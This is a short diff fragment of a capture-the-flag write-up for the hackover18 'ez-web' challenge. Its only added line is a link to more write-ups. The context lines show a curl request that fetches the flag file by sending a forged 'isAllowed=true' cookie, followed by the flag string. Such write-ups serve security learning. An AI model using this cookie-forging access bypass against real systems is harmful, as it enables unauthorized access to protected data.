@@ -34,3 +34,5 @@ curl http://ez-web.ctf.hackover.de:8080/flag/flag.txt --cookie "isAllowed=true"
 
 ### flag
 hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}
+
+[more write-ups](../../)
